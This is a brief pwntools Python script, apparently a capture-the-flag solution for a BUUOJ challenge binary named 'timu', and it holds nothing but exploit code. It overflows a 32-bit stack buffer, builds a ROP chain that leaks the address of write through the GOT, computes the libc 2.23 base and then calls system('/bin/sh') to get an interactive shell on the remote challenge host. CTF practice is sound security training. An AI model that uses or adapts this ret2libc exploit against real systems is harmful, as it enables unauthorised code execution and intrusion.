from pwn import *

#sh=process("./timu")
sh=remote("node4.buuoj.cn",28766)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

write_plt=p32(elf.plt["write"])
write_got=p32(elf.got["write"])
main_addr=p32(0x08048484)

payload=0x8c*b'a'+write_plt+main_addr+p32(1)+write_got+p32(4)
sh.sendline(payload)
sh.recvuntil(b'Input:\n')
#print("recv =",sh.recv())

write_addr=u32(sh.recv(4))
print("write_addr =",write_addr)
libc_base=write_addr-libc.sym["write"]
system_addr=p32(libc_base+libc.sym["system"])
bin_sh=p32(libc_base+next(libc.search(b"/bin/sh")))
payload=0x8c*b'a'+system_addr+p32(0xdeadbeef)+bin_sh
sh.sendline(payload)

sh.interactive()
